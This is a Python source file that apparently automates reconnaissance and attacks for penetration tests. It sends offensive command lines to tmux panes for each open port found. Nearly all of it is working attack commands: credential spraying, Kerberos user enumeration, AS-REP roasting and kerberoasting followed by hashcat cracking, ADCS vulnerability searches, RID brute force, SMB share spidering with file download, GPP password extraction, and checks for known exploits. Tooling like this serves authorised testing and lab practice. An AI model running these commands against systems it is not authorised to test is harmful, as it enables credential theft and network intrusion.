from time import sleep

import libtmux

from utils.logger import write_log
from utils.active_directory import enum_smb_shares, anonymous_bind


SPRAYABLE_PORTS = {21: "ftp", 22: "ssh", 135: "wmi", 389: "ldap", 445: "smb", 1433: "mssql", 3389: "rdp", 5900: "vnc", 5985: "winrm"}


class PortHandlerRegistry:
    def __init__(self):
        self.port_handlers = {}

    def register_port_handler(self, *ports):
        def decorator(func):
            for port in ports:
                self.port_handlers.setdefault(port, []).append(func)
            return func
        return decorator


port_registry = PortHandlerRegistry()


def handle_task(context, port):
    """Main entry point for port handling"""
    port = int(port)
    if port in SPRAYABLE_PORTS:
        context.sprayable_ports[port] = SPRAYABLE_PORTS[port]
    if port in port_registry.port_handlers:
        for task_handler in port_registry.port_handlers[port]:
            task_handler(context)


def run_task(context, command):
    target_pane = prepare_task_pane(context)
    if target_pane:
        if "nxc" in command:
            target_pane.send_keys(f"sleep 7; {command}") # Prevents NetBIOSTimeout exception
        elif "kerbrute" in command:
            target_pane.send_keys(f"sleep 20; {command}")
        else:
            target_pane.send_keys(f"sleep {context.current_task_pane * 2}; {command}")
    else:
        write_log(context.log_file, f"Failed to create pane for task: {command}")


def stage_task(context, command):
    target_pane = prepare_task_pane(context)
    if target_pane:
        target_pane.send_keys(command, enter=False)


def prepare_task_pane(context):
    if (context.current_task_window is None or context.current_task_pane > 5):
        # Create a new task window
        window_name = f"tasks{context.task_window_count}"
        new_window = context.session.new_window(
            window_name=window_name, 
            attach=False
        )
        # Split into 6 panes (5 splits)
        pane = new_window.attached_pane
        for _ in range(2):
            pane = pane.split()
            pane = pane.split(direction=libtmux.pane.PaneDirection.Right)
        pane = pane.split()
        new_window.select_layout('tiled')
        # Update session tracking
        context.current_task_window = new_window
        context.task_window_count += 1
        context.current_task_pane = 0
        sleep(1) # Give panes time to initialize
    # Get the next available pane
    panes = context.current_task_window.panes
    if context.current_task_pane < len(panes):
        target_pane = panes[context.current_task_pane]
        context.current_task_pane += 1
        return target_pane
    return None


# @port_registry.register_port_handler()
# def proto_tasks(context):
#     run_task(context, f"")


@port_registry.register_port_handler(21)
def proto_tasks(context):
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        if passwd:
            run_task(context, f"nxc ftp {context.ip} -u '' -p '' --ls; nxc ftp {context.ip} -u {user} -p '{passwd}' --ls")
    else:
        run_task(context, f"nxc ftp {context.ip} -u '' -p '' --ls")


@port_registry.register_port_handler(53)
def dns_tasks(context):
    run_task(context, f"dig @{context.ip} -x {context.ip} +short; dig axfr @{context.ip} {context.domain}")


@port_registry.register_port_handler(80)
def http_tasks(context):
    target = context.get_target()
    if target:
        run_task(context, f"firefox 'http://{target}' &> /dev/null & disown; ffuf -w /usr/share/seclists/Discovery/DNS/services-names.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac -c; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://{target}/FUZZ -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ -ac -c; feroxbuster -u http://{target}")
    else:
        target = context.ip
        run_task(context, f"firefox 'http://{target}' &> /dev/null & disown; ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://{target}/FUZZ -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ -ac -c; feroxbuster -u http://{target}")
    run_task(context, f"wpscan --no-update --url http://{target} --detection-mode aggressive -e ap,u; wpscan --no-update --url http://{target} --detection-mode aggressive -e ap,u --plugins-detection aggressive -o wpscan_long.out")


@port_registry.register_port_handler(88)
def kerberos_tasks(context):
    if context.domain:
        if context.creds_exist():
            user, passwd = context.get_initial_cred()
            run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" getTGT.py {context.domain}/{user}:'{passwd}'")
        run_task(context, f"kerbrute userenum -d {context.domain} --dc {context.ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")


@port_registry.register_port_handler(135)
def proto_tasks(context):
    run_task(context, f"echo querydominfo | rpcclient {context.ip}; echo querydominfo | rpcclient -U '' -N {context.ip}")


@port_registry.register_port_handler(389)
def ldap_tasks(context):
    context.is_ad = True
    target = context.get_target()
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" bloodyAD --host {target} -d {context.domain} -u {user} -p '{passwd}' -k get writable; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k -M maq -M sccm -M laps -M adcs -M pre2k; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet; bloodhound.py --zip -c All -d {context.domain} -dc {target} -ns {context.ip} -u {user} -p '{passwd}'")
        run_task(context, f"rm -f $(pwd)/initial_enabled_Certipy.json; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -output initial_enabled -timeout 2 -enabled; echo -e '\n<--- Find Vulnerable: --->\n'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -timeout 2 -vulnerable; echo; parse_certipy.py initial_enabled_Certipy.json; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" powerview {context.domain}/{user}:'{passwd}'@{target} -k --web")
        run_task(context, "neo4j start; sleep 10; bloodhound &> /dev/null & disown")
    else:
        if anonymous_bind(context):
            write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
            run_task(context, f"nxc ldap {target} -u '' -p '' --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet")
            run_task(context, f"powerview {target}")


@port_registry.register_port_handler(443)
def proto_tasks(context):
    fqdn = context.vhost or context.domain or context.ip
    run_task(context, f"firefox 'https://{fqdn}' &> /dev/null & disown; curl -Ik https://{fqdn}")


@port_registry.register_port_handler(445)
def smb_tasks(context):
    target = context.get_target()
    shares, method = enum_smb_shares(context)
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"aliasr scan {context.ip} -u {user} -p '{passwd}'")
        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --pass-pol --shares; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k -M timeroast; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p {passwd} -k -M webdav -M spooler -M ioxidresolver -M gpp_autologin -M gpp_password -M ms17-010 -M nopac -M remove-mic -M smbghost -M enum_ca -M aws-credentials -M coerce_plus; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p {passwd} -k -M printnightmare")
        run_task(context, f"rm -f $(pwd)/smb.out; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; echo; cat users.txt; echo")
    else:
        run_task(context, f"aliasr scan {context.ip}")
        run_task(context, f"rm -f $(pwd)/smb.out; nxc smb {context.ip} -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; nxc smb {context.ip} -u 'a' -p '' --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; echo; cat users.txt; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u users.txt -p users.txt -k --no-bruteforce --continue-on-success; nxc smb {context.ip} -u users.txt -p '' --continue-on-success")
    if shares:
        for share in shares:
            if share['name'] not in ['ADMIN$', 'C$', 'Users', 'IPC$', 'NETLOGON', 'SYSVOL']:
                write_log(context.log_file, f"Found non-default share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
                if method == 'user/pass':
                    run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --spider '{share['name']}' --regex . --depth 2")
                elif method == 'null':
                    run_task(context, f"nxc smb {context.ip} -u '' -p '' --spider '{share['name']}' --regex . --depth 2")
                elif method == 'guest':
                    run_task(context, f"nxc smb {context.ip} -u 'a' -p '' --spider '{share['name']}' --regex . --depth 2")
            if 'WRITE' in share['access']:
                write_log(context.log_file, f"Found writeable share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
        if method == 'user/pass':
            run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" smbclientng --host {target} -d {context.domain} -u {user} -p '{passwd}' -k -C shares")
        elif method == 'null':
            run_task(context, f"nxc smb {context.ip} -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u '' -p '' -C shares")
        elif method == 'guest':
            run_task(context, f"nxc smb {context.ip} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u a -p '' -C shares")


@port_registry.register_port_handler(1433)
def proto_tasks(context):
    if context.creds_exist():
        user, passwd = context.get_initial_cred()
        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc mssql {context.ip} -u {user} -p '{passwd}' -k -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' --local-auth -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' -d . -M enum_impersonate -M enum_links -M enum_logins")
        run_task(context, f"mssqlclient.py {context.domain}/{user}:'{passwd}'@{context.ip}")
        run_task(context, f"mssqlclient.py {context.domain}/{user}:'{passwd}'@{context.ip} -windows-auth")


@port_registry.register_port_handler(2049)
def proto_tasks(context):
    run_task(context, f"showmount -e {context.ip}; nxc nfs {context.ip} --enum-shares")
